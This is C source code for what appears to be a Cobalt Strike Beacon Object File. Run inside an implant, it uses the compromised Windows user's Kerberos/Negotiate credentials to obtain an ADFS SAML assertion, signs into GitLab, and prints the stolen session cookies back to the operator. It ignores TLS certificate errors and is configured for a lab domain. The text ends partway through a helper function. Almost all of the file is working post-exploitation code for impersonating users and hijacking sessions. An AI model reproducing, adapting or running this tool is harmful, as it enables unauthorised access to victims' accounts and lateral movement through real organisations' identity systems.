#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Wininet.lib")
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"
#include <stdio.h>
#include <winternl.h>
#include <sspi.h>
#include "bofdefs.h"
#include <wininet.h>

 // ==================== CONFIGURATION - MODIFY THESE ====================
 // Domain and network configuration
#define TARGET_DOMAIN "ludus.nuketown"
#define GITLAB_HOST "gitlab.ludus.nuketown"
#define ADFS_HOST "adfs.ludus.nuketown"
// SPN Configuration
#define SPN_VALUE "HTTP/adfs.ludus.nuketown"
// Proxy Configuration
#define USE_PROXY FALSE
#define PROXY_ADDRESS "127.0.0.1:8080"
// HTTP Configuration
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0"
#define MAX_REDIRECTS 10
// Paths
#define GITLAB_SIGNIN_PATH "/users/sign_in"
#define GITLAB_SAML_PATH "/users/auth/saml"
#define GITLAB_CALLBACK_PATH "/users/auth/saml/callback"
// Buffer sizes
#define CHUNK_SIZE 4096
#define HOST_BUFFER_SIZE 256
#define PATH_BUFFER_SIZE 1024
#define HEADER_BUFFER_SIZE 4096
#define REFERER_BUFFER_SIZE 1024


// ==================== SAML Flow Here ====================
// 1. First request will hit the Application Sign-In URL (This is because we will be using the applicatition to generate the SAML request, otherwise 
// we would need to guess the claims within the SAML Request. This will generate an authenticity token that can be used to request a SAMLrequest token.
// 2. Make a request for a SAMLrequest token. The application will return a redirect URL with the SAML request
// 3. Provide SAML request to ADFS server
// 4. Provide SAML assertion back to application for session cookies


// ==================== FUNCTION DECLARATIONS ====================
    static void print_last_error(const char* msg);
    char* retrieveParamValue(const char* data, DWORD len, const char* param);
    static int append_bytes(char** out, size_t* out_len, size_t* out_cap, const char* src, size_t src_len);
    char* extract_authenticity_token(const char* data, size_t len);
    char* extract_saml_response(const char* data, size_t len);
    char* url_encode(const char* str);
    char* get_location_header(HINTERNET hRequest);
    void parse_url(const char* url, char* host, size_t host_size, char* path, size_t path_size, INTERNET_PORT* port, BOOL* is_https);
    void print_all_cookies(const char* url);
    void print_cookies_from_header(HINTERNET hRequest);
    char* generate_spnego_token(CredHandle* hCredHandle, CtxtHandle* hNewCtx);
    HINTERNET setup_http_session();
    HINTERNET create_http_request(HINTERNET hConnect, const char* method, const char* path, const char* referer, DWORD flags);
    BOOL send_http_request(HINTERNET hRequest, const char* headers, const char* postData, DWORD postDataLen);
    char* read_http_response(HINTERNET hRequest, size_t* resp_len);
    char* perform_request_1_get_signin_page(HINTERNET hSession, HINTERNET hConnect);
    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token);
    char* perform_request_3_follow_redirects(HINTERNET hSession, HINTERNET hConnect, const char* initialLocation, const char* base64Token, char** last_referer);
    void perform_request_4_post_saml_callback(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* referer);
    void clear_all_cookies();
    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
    unsigned __stdcall performSAML(void* p);

    // ==================== Entry Point ====================
    void go(PCHAR args, int len) {
        //Using a vectored exception handler, just because if anything weird does happen related to memory i dont want this to crash the beacon
        DWORD exitcode = 0;
        HANDLE thread = NULL;
        PVOID eHandler = NULL;
        eHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
        thread = (HANDLE)_beginthreadex(NULL, 0, performSAML, NULL, 0, NULL);
        WaitForSingleObject(thread, INFINITE);
        GetExitCodeThread(thread, &exitcode);
        if (exitcode != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x\n", exitcode);
        }
        if (thread) { CloseHandle(thread); }
        if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
    }

    // ==================== Main Function ====================
    unsigned __stdcall performSAML(void* p) {
        // Initialize all variables at the top to avoid goto issues
        char* base64TokenForAdfs = NULL;
        CredHandle hCredForAdfs = { 0 };
        CtxtHandle hCtxForAdfs = { 0 };
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        char* authenticityToken = NULL;
        char* samlResponse = NULL;
        char* samlRequest = NULL;
        char* lastReferer = NULL;
        BOOL credHandleForAdfsAcquired = FALSE;
        BOOL ctxForAdfsInitialized = FALSE;

        // If cookies arent cleared, reruns of this BOF wont work
        clear_all_cookies();
        // Setup HTTP session
        hSession = setup_http_session();
        if (!hSession) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to setup HTTP session");
            goto cleanup;
        }

        // Connect to GitLab
        hConnect = InternetConnectA(
            hSession,
            GITLAB_HOST,
            INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        if (!hConnect) {
            print_last_error("[!] InternetConnect failed");
            goto cleanup;
        }

        // ==================== REQUEST 1: GET Sign-In Page ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 1: GET Sign-In Page");
        authenticityToken = perform_request_1_get_signin_page(hSession, hConnect);
        if (!authenticityToken) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 1 FAILED: Could not extract authenticity_token");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token");

        // ==================== REQUEST 2: POST SAML Authentication ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST Request for SAMLRequest token");
        samlRequest = perform_request_2_post_saml_auth(hSession, hConnect, authenticityToken);
        if (!samlRequest) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 2 FAILED: No redirect location received");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 2 SUCCESS: Received redirect to ADFS");

        // ==================== REQUEST 3: Follow Redirect Chain to ADFS ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: ADFS SAML Assertion Request");

        // Generate SPNEGO token for ADFS right before use
        base64TokenForAdfs = generate_spnego_token(&hCredForAdfs, &hCtxForAdfs);
        if (!base64TokenForAdfs) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to generate SPNEGO token for ADFS");
            goto cleanup;
        }
        credHandleForAdfsAcquired = TRUE;
        ctxForAdfsInitialized = TRUE;

        lastReferer = NULL;
        samlResponse = perform_request_3_follow_redirects(hSession, hConnect, samlRequest, base64TokenForAdfs, &lastReferer);
        if (!samlResponse) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse found in redirect chain");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 3 SUCCESS: Retrieved SAMLResponse from ADFS");

        // ==================== REQUEST 4: POST SAMLResponse to Callback ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: Provide SAML Response back to Application for Session Cookies");
        perform_request_4_post_saml_callback(hSession, hConnect, samlResponse, lastReferer);

    cleanup:
        // Cleanup in reverse order of allocation
        if (lastReferer) intFree(lastReferer);
        if (samlResponse) intFree(samlResponse);
        if (samlRequest) intFree(samlRequest);
        if (authenticityToken) intFree(authenticityToken);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hSession) InternetCloseHandle(hSession);
        if (base64TokenForAdfs) intFree(base64TokenForAdfs);
        if (ctxForAdfsInitialized) DeleteSecurityContext(&hCtxForAdfs);
        if (credHandleForAdfsAcquired) FreeCredentialsHandle(&hCredForAdfs);
        clear_all_cookies();
        return 0;
    }
    // ==================== SPNEGO TOKEN GENERATION ====================
    char* generate_spnego_token(CredHandle* hCredHandle, CtxtHandle* hNewCtx) {
        SECURITY_STATUS secStatus;
        TimeStamp tsExpiry;
        char pszPackageName[] = "Negotiate";
        char* base64Token = NULL;

        // Acquire credentials handle
        secStatus = AcquireCredentialsHandleA(
            NULL, pszPackageName, SECPKG_CRED_BOTH,
            NULL, NULL, NULL, NULL, hCredHandle, &tsExpiry
        );
        if (secStatus != SEC_E_OK) {
            BeaconPrintf(CALLBACK_ERROR, "[!] AcquireCredentialsHandle failed (Error: %ld)", secStatus);
            return NULL;
        }

        // Setup security buffers
        SecBuffer OutSecBuff = { 0 };
        SecBufferDesc OutBuffDesc = { 0 };
        int fContextAttr = 0;

        OutSecBuff.cbBuffer = 0;
        OutSecBuff.BufferType = SECBUFFER_TOKEN;
        OutSecBuff.pvBuffer = NULL;

        OutBuffDesc.ulVersion = SECBUFFER_VERSION;
        OutBuffDesc.cBuffers = 1;
        OutBuffDesc.pBuffers = &OutSecBuff;

        // Initialize security context with static SPN
        secStatus = InitializeSecurityContextA(
            hCredHandle, NULL, (SEC_CHAR*)SPN_VALUE,
            ISC_REQ_SEQUENCE_DETECT | ISC_REQ_ALLOCATE_MEMORY,
            0, SECURITY_NATIVE_DREP, NULL, 0,
            hNewCtx, &OutBuffDesc, (unsigned long*)&fContextAttr, &tsExpiry
        );
        if (secStatus != SEC_I_CONTINUE_NEEDED) {
            BeaconPrintf(CALLBACK_ERROR, "[!] InitializeSecurityContextA failed (Error: %ld)", secStatus);
            return NULL;
        }

        // Convert token to Base64
        if (OutSecBuff.pvBuffer && OutSecBuff.cbBuffer > 0) {
            DWORD encodedLen = 0;
            if (!CryptBinaryToStringA((BYTE*)OutSecBuff.pvBuffer, OutSecBuff.cbBuffer,
                CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedLen)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get Base64 length");
                FreeContextBuffer(OutSecBuff.pvBuffer);
                return NULL;
            }

            base64Token = (char*)intAlloc(encodedLen);
            if (!base64Token) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for Base64 token");
                FreeContextBuffer(OutSecBuff.pvBuffer);
                return NULL;
            }

            if (!CryptBinaryToStringA((BYTE*)OutSecBuff.pvBuffer, OutSecBuff.cbBuffer,
                CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Token, &encodedLen)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert to Base64");
                intFree(base64Token);
                FreeContextBuffer(OutSecBuff.pvBuffer);
                return NULL;
            }
            FreeContextBuffer(OutSecBuff.pvBuffer);
        }

        return base64Token;
    }

    // ==================== HTTP SESSION SETUP ====================
    HINTERNET setup_http_session() {
        HINTERNET hSession = InternetOpenA(
            USER_AGENT,
            USE_PROXY ? INTERNET_OPEN_TYPE_PROXY : INTERNET_OPEN_TYPE_PRECONFIG,
            USE_PROXY ? PROXY_ADDRESS : NULL,
            0,
            0
        );
        if (!hSession) {
            print_last_error("[!] InternetOpen failed");
        }
        return hSession;
    }

    // ==================== HTTP REQUEST HELPERS ====================
    HINTERNET create_http_request(HINTERNET hConnect, const char* method, const char* path, const char* referer, DWORD flags) {
        const char* acceptTypes[] = { "*/*", NULL };
        HINTERNET hRequest = HttpOpenRequestA(
            hConnect,
            method,
            path,
            "HTTP/1.1",
            referer,
            acceptTypes,
            flags,
            0
        );
        if (!hRequest) {
            print_last_error("[!] HttpOpenRequest failed");
            return NULL;
        }

        // Ignore cert errors
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

        return hRequest;
    }
    BOOL send_http_request(HINTERNET hRequest, const char* headers, const char* postData, DWORD postDataLen) {
        if (headers) {
            if (!HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE)) {
                print_last_error("[!] HttpAddRequestHeaders failed");
                return FALSE;
            }
        }

        if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)postData, postDataLen)) {
            print_last_error("[!] HttpSendRequest failed");
            return FALSE;
        }
        return TRUE;
    }

    char* read_http_response(HINTERNET hRequest, size_t* resp_len) {
        char* chunk = (char*)intAlloc(CHUNK_SIZE);
        if (!chunk) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for read buffer");
            return NULL;
        }

        DWORD read = 0;
        char* resp = NULL;
        size_t resp_cap = 0;
        *resp_len = 0;

        while (InternetReadFile(hRequest, chunk, CHUNK_SIZE, &read) && read > 0) {
            if (!append_bytes(&resp, resp_len, &resp_cap, chunk, (size_t)read)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Out of memory while buffering response");
                intFree(chunk);
                if (resp) intFree(resp);
                return NULL;
            }
        }

        intFree(chunk);
        return resp;
    }
    // ==================== REQUEST 1: GET SIGN-IN PAGE ====================
    char* perform_request_1_get_signin_page(HINTERNET hSession, HINTERNET hConnect) {
        char* token = NULL;
        char* resp = NULL;
        size_t resp_len = 0;
        HINTERNET hRequest = NULL;

        const char* headers =
            "Upgrade-Insecure-Requests: 1\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n";

        hRequest = create_http_request(
            hConnect,
            "GET",
            GITLAB_SIGNIN_PATH,
            NULL,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD
        );
        if (!hRequest) {
            goto cleanup;
        }

        if (!send_http_request(hRequest, headers, NULL, 0)) {
            goto cleanup;
        }

        resp = read_http_response(hRequest, &resp_len);
        if (!resp) {
            goto cleanup;
        }

        token = extract_authenticity_token(resp, resp_len);
        if (!token) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not find authenticity_token in response");
        }

    cleanup:
        if (resp) intFree(resp);
        if (hRequest) InternetCloseHandle(hRequest);
        return token;
    }
    // ==================== REQUEST 2: POST SAML AUTH ====================
    char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token) {
        char* resp = NULL;
        size_t resp_len = 0;
        char* location = NULL;
        char* postData = NULL;
        HINTERNET hRequest = NULL;
        int postDataLen = 0;
        DWORD statusCode = 0;
        DWORD statusCodeSize = 0;

        // Build POST data
        postData = (char*)intAlloc(4096);
        if (!postData) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for POST data");
            return NULL;
        }

        const char* headers =
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Cache-Control: max-age=0\r\n"
            "Origin: https://" GITLAB_HOST "\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Referer: https://" GITLAB_HOST GITLAB_SIGNIN_PATH "\r\n";

        postDataLen = _snprintf(postData, 4096, "authenticity_token=%s", token);

        hRequest = create_http_request(
            hConnect,
            "POST",
            GITLAB_SAML_PATH,
            "https://" GITLAB_HOST GITLAB_SIGNIN_PATH,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT
        );
        if (!hRequest) {
            goto cleanup;
        }

        if (!send_http_request(hRequest, headers, postData, postDataLen)) {
            goto cleanup;
        }

        // Check status code
        statusCode = 0;
        statusCodeSize = sizeof(statusCode);
        HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
            &statusCode, &statusCodeSize, NULL);

        resp = read_http_response(hRequest, &resp_len);

        // Get Location header if redirect
        if (statusCode >= 300 && statusCode < 400) {
            location = get_location_header(hRequest);
            if (location) {
                return location;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "[!] Expected redirect but no Location header found");
            }
        }

    cleanup:
        if (resp) intFree(resp);
        if (postData) intFree(postData);
        if (hRequest) InternetCloseHandle(hRequest);
        return NULL; // This request doesn't return data, only redirect location
    }

    // ==================== REQUEST 3: FOLLOW REDIRECT CHAIN ====================
    char* perform_request_3_follow_redirects(HINTERNET hSession, HINTERNET hConnect, const char* initialLocation, const char* base64Token, char** last_referer) {
        char* samlResponse = NULL;
        char* current_location = NULL;
        HINTERNET hConnectCurrent = NULL;
        BOOL need_new_connection = FALSE;
        int redirect_count = 0;

        // Allocate buffers on heap
        char* redirect_host = (char*)intAlloc(HOST_BUFFER_SIZE);
        char* redirect_path = (char*)intAlloc(PATH_BUFFER_SIZE);
        char* current_referer_buf = (char*)intAlloc(REFERER_BUFFER_SIZE);
        char* headersCurrent = (char*)intAlloc(HEADER_BUFFER_SIZE);

        if (!redirect_host || !redirect_path || !current_referer_buf || !headersCurrent) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for redirect buffers");
            goto cleanup;
        }

        current_location = (char*)intAlloc(strlen(initialLocation) + 1);
        if (!current_location) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for location");
            goto cleanup;
        }
        strcpy(current_location, initialLocation);

        _snprintf(current_referer_buf, REFERER_BUFFER_SIZE, "https://" GITLAB_HOST GITLAB_SAML_PATH);

        while (current_location && redirect_count < MAX_REDIRECTS) {
            redirect_count++;

            // Parse URL
            INTERNET_PORT redirect_port = INTERNET_DEFAULT_HTTPS_PORT;
            BOOL is_https = TRUE;
            parse_url(current_location, redirect_host, HOST_BUFFER_SIZE,
                redirect_path, PATH_BUFFER_SIZE, &redirect_port, &is_https);

            // Check if we need a new connection
            need_new_connection = (strlen(redirect_host) > 0 && strcmp(redirect_host, GITLAB_HOST) != 0);

            if (need_new_connection) {
                hConnectCurrent = InternetConnectA(
                    hSession,
                    redirect_host,
                    redirect_port,
                    NULL, NULL,
                    INTERNET_SERVICE_HTTP,
                    0, 0
                );
                if (!hConnectCurrent) {
                    print_last_error("  [!] InternetConnect (Redirect) failed");
                    break;
                }
            }
            else {
                hConnectCurrent = hConnect;
            }

            DWORD request_flags = (is_https ? INTERNET_FLAG_SECURE : 0) |
                INTERNET_FLAG_KEEP_CONNECTION |
                INTERNET_FLAG_NO_CACHE_WRITE |
                INTERNET_FLAG_NO_AUTO_REDIRECT;

            HINTERNET hRequestCurrent = create_http_request(
                hConnectCurrent,
                "GET",
                redirect_path,
                current_referer_buf,
                request_flags
            );

            if (!hRequestCurrent) {
                if (need_new_connection) InternetCloseHandle(hConnectCurrent);
                break;
            }

            // Add Authorization header with SPNEGO token
            _snprintf(headersCurrent, HEADER_BUFFER_SIZE,
                "Authorization: Negotiate %s\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                base64Token);

            if (!send_http_request(hRequestCurrent, headersCurrent, NULL, 0)) {
                InternetCloseHandle(hRequestCurrent);
                if (need_new_connection) InternetCloseHandle(hConnectCurrent);
                break;
            }

            DWORD currentStatusCode = 0;
            DWORD currentStatusCodeSize = sizeof(currentStatusCode);
            HttpQueryInfoA(hRequestCurrent, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &currentStatusCode, &currentStatusCodeSize, NULL);

            // Read response
            size_t respCurrent_len = 0;
            char* respCurrent = read_http_response(hRequestCurrent, &respCurrent_len);

            if (respCurrent && respCurrent_len > 0) {
                char* tempSamlResponse = extract_saml_response(respCurrent, respCurrent_len);
                if (tempSamlResponse) {
                    if (samlResponse) intFree(samlResponse);
                    samlResponse = tempSamlResponse;

                    if (*last_referer) intFree(*last_referer);
                    *last_referer = (char*)intAlloc(strlen(current_location) + 1);
                    if (*last_referer) {
                        strcpy(*last_referer, current_location);
                    }
                }
                intFree(respCurrent);
            }

            // Update referer
            _snprintf(current_referer_buf, REFERER_BUFFER_SIZE, "%s", current_location);

            // Check for next redirect
            char* next_location = NULL;
            if (currentStatusCode >= 300 && currentStatusCode < 400) {
                next_location = get_location_header(hRequestCurrent);
            }

            InternetCloseHandle(hRequestCurrent);
            if (need_new_connection) InternetCloseHandle(hConnectCurrent);

            intFree(current_location);
            current_location = next_location;

            if (!current_location) {
                break;
            }
        }

        if (redirect_count >= MAX_REDIRECTS) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Max redirects (%d) reached", MAX_REDIRECTS);
        }

    cleanup:
        if (current_location) intFree(current_location);
        if (redirect_host) intFree(redirect_host);
        if (redirect_path) intFree(redirect_path);
        if (current_referer_buf) intFree(current_referer_buf);
        if (headersCurrent) intFree(headersCurrent);
        return samlResponse;
    }
    // ==================== REQUEST 4: POST SAML CALLBACK ====================
    void perform_request_4_post_saml_callback(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* referer) {
        char* encodedSamlResponse = NULL;
        char* postDataFinal = NULL;
        char* headersFinal = NULL;
        char* resp = NULL;
        size_t resp_len = 0;
        HINTERNET hRequestFinal = NULL;
        DWORD finalStatusCode = 0;
        DWORD finalStatusCodeSize = sizeof(finalStatusCode);

        // URL encode the SAML response
        encodedSamlResponse = url_encode(samlResponse);
        if (!encodedSamlResponse) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to URL encode SAMLResponse");
            return;
        }

        // Build POST data
        size_t postDataFinalLen = strlen("SAMLResponse=") + strlen(encodedSamlResponse) + 1;
        postDataFinal = (char*)intAlloc(postDataFinalLen);
        if (!postDataFinal) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for POST data");
            goto cleanup;
        }
        _snprintf(postDataFinal, postDataFinalLen, "SAMLResponse=%s", encodedSamlResponse);

        hRequestFinal = create_http_request(
            hConnect,
            "POST",
            GITLAB_CALLBACK_PATH,
            referer ? referer : "https://" ADFS_HOST "/",
            INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_CACHE_WRITE
        );

        if (!hRequestFinal) {
            goto cleanup;
        }

        // Build headers
        headersFinal = (char*)intAlloc(HEADER_BUFFER_SIZE);
        if (!headersFinal) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for headers");
            goto cleanup;
        }

        _snprintf(headersFinal, HEADER_BUFFER_SIZE,
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Origin: https://" ADFS_HOST "\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Referer: %s\r\n",
            referer ? referer : "https://" ADFS_HOST "/");

        if (!send_http_request(hRequestFinal, headersFinal, postDataFinal, (DWORD)strlen(postDataFinal))) {
            goto cleanup;
        }

        HttpQueryInfoA(hRequestFinal, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
            &finalStatusCode, &finalStatusCodeSize, NULL);

        resp = read_http_response(hRequestFinal, &resp_len);

        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Retrieving session cookies...");
        print_cookies_from_header(hRequestFinal);
        print_all_cookies("https://" GITLAB_HOST);

    cleanup:
        if (hRequestFinal) InternetCloseHandle(hRequestFinal);
        if (resp) intFree(resp);
        if (headersFinal) intFree(headersFinal);
        if (postDataFinal) intFree(postDataFinal);
        if (encodedSamlResponse) intFree(encodedSamlResponse);
    }
    // ==================== HELPER FUNCTIONS ====================
    void print_cookies_from_header(HINTERNET hRequest) {
        DWORD index = 0;
        char* buffer = (char*)intAlloc(HEADER_BUFFER_SIZE);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for cookie buffer");
            return;
        }

        DWORD bufferSize = HEADER_BUFFER_SIZE;
        int cookie_count = 0;

        while (HttpQueryInfoA(hRequest, HTTP_QUERY_SET_COOKIE, buffer, &bufferSize, &index)) {
            cookie_count++;
            BeaconPrintf(CALLBACK_OUTPUT, "  Cookie %d: %s", cookie_count, buffer);
            bufferSize = HEADER_BUFFER_SIZE;
        }

        if (cookie_count == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [*] No Set-Cookie headers found");
        }

        intFree(buffer);
    }
    void print_all_cookies(const char* url) {
        DWORD cookieSize = 0;
        InternetGetCookieA(url, NULL, NULL, &cookieSize);

        if (cookieSize == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [*] No cookies stored for %s", url);
            return;
        }

        char* cookies = (char*)intAlloc(cookieSize);
        if (!cookies) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for cookies");
            return;
        }

        if (InternetGetCookieA(url, NULL, cookies, &cookieSize)) {
            char* token_context = NULL;
            char* cookie = strtok_s(cookies, ";", &token_context);
            int cookie_count = 0;

            while (cookie) {
                while (*cookie == ' ') cookie++;
                cookie_count++;
                BeaconPrintf(CALLBACK_OUTPUT, "  Cookie %d: %s", cookie_count, cookie);
                cookie = strtok_s(NULL, ";", &token_context);
            }

            if (cookie_count > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [+] Total cookies: %d", cookie_count);
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve cookies (Error: %lu)", GetLastError());
        }

        intFree(cookies);
    }
    char* extract_saml_response(const char* data, size_t len) {
        const char* end = data + len;
        const char needle[] = "name=\"SAMLResponse\"";
        const size_t needle_len = sizeof(needle) - 1;
        const char* p = data;

        while (p + needle_len < end) {
            const char* hit = NULL;
            for (const char* s = p; s + needle_len < end; ++s) {
                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, needle, needle_len) == 0) {
                    hit = s;
                    break;
                }
            }
            if (!hit) return NULL;

            const char* tag_end = hit;
            while (tag_end < end && *tag_end != '>') tag_end++;
            if (tag_end >= end) return NULL;

            const char* value_key = "value=";
            const size_t value_key_len = 6;
            const char* value_pos = NULL;

            for (const char* s = hit; s + value_key_len < tag_end; ++s) {
                if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                    value_pos = s + value_key_len;
                    break;
                }
            }

            if (!value_pos) {
                const char* tag_start = hit;
                while (tag_start > data && *tag_start != '<') tag_start--;
                if (*tag_start == '<') {
                    for (const char* s = tag_start; s + value_key_len < tag_end; ++s) {
                        if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                            value_pos = s + value_key_len;
                            break;
                        }
                    }
                }
            }

            if (!value_pos || value_pos >= tag_end) {
                p = hit + needle_len;
                continue;
            }

            char quote = *value_pos;
            if (quote != '"' && quote != '\'') {
                p = hit + needle_len;
                continue;
            }

            const char* val_start = value_pos + 1;
            const char* val_end = val_start;
            while (val_end < tag_end && *val_end != quote) val_end++;
            if (val_end >= tag_end) return NULL;

            size_t out_len = (size_t)(val_end - val_start);
            char* out = (char*)intAlloc(out_len + 1);
            if (!out) return NULL;

            memcpy(out, val_start, out_len);
            out[out_len] = '\0';
            return out;
        }

        return NULL;
    }
    char* url_encode(const char* str) {
        if (!str) return NULL;

        size_t len = strlen(str);
        char* encoded = (char*)intAlloc(len * 3 + 1);
        if (!encoded) return NULL;

        char* pOutput = encoded;
        for (size_t i = 0; i < len; i++) {
            unsigned char c = (unsigned char)str[i];
            if ((c >= '0' && c <= '9') ||
                (c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z') ||
                c == '-' || c == '_' || c == '.' || c == '~') {
                *pOutput++ = c;
            }
            else {
                sprintf(pOutput, "%%%02X", c);
                pOutput += 3;
            }
        }
        *pOutput = '\0';
        return encoded;
    }
    char* get_location_header(HINTERNET hRequest) {
        DWORD bufferSize = 0;
        HttpQueryInfoA(hRequest, HTTP_QUERY_LOCATION, NULL, &bufferSize, NULL);

        if (bufferSize == 0) {
            return NULL;
        }

        char* location = (char*)intAlloc(bufferSize + 1);
        if (!location) return NULL;

        if (!HttpQueryInfoA(hRequest, HTTP_QUERY_LOCATION, location, &bufferSize, NULL)) {
            intFree(location);
            return NULL;
        }

        location[bufferSize] = '\0';
        return location;
    }
    void parse_url(const char* url, char* host, size_t host_size, char* path, size_t path_size, INTERNET_PORT* port, BOOL* is_https) {
        const char* p = url;

        if (strncmp(p, "https://", 8) == 0) {
            *is_https = TRUE;
            *port = INTERNET_DEFAULT_HTTPS_PORT;
            p += 8;
        }
        else if (strncmp(p, "http://", 7) == 0) {
            *is_https = FALSE;
            *port = INTERNET_DEFAULT_HTTP_PORT;
            p += 7;
        }
        else {
            host[0] = '\0';
            strncpy(path, url, path_size - 1);
            path[path_size - 1] = '\0';
            return;
        }

        const char* host_end = p;
        while (*host_end && *host_end != '/' && *host_end != ':') {
            host_end++;
        }

        size_t host_len = host_end - p;
        if (host_len >= host_size) host_len = host_size - 1;
        strncpy(host, p, host_len);
        host[host_len] = '\0';

        p = host_end;
        if (*p == ':') {
            p++;
            *port = (INTERNET_PORT)atoi(p);
            while (*p && *p != '/') p++;
        }

        if (*p == '/') {
            strncpy(path, p, path_size - 1);
            path[path_size - 1] = '\0';
        }
        else {
            strcpy(path, "/");
        }
    }
    static int append_bytes(char** out, size_t* out_len, size_t* out_cap, const char* src, size_t src_len) {
        if (src_len == 0) return 1;

        if (*out_len + src_len + 1 > *out_cap) {
            size_t new_cap = (*out_cap == 0) ? 8192 : *out_cap;
            while (new_cap < *out_len + src_len + 1) new_cap *= 2;

            char* p = (char*)intAlloc(new_cap);
            if (!p) return 0;

            if (*out) {
                memcpy(p, *out, *out_len);
                intFree(*out);
            }
            *out = p;
            *out_cap = new_cap;
        }

        memcpy(*out + *out_len, src, src_len);
        *out_len += src_len;
        (*out)[*out_len] = '\0';
        return 1;
    }
    char* retrieveParamValue(const char* data, DWORD len, const char* param) {
        if (!data || !param) {
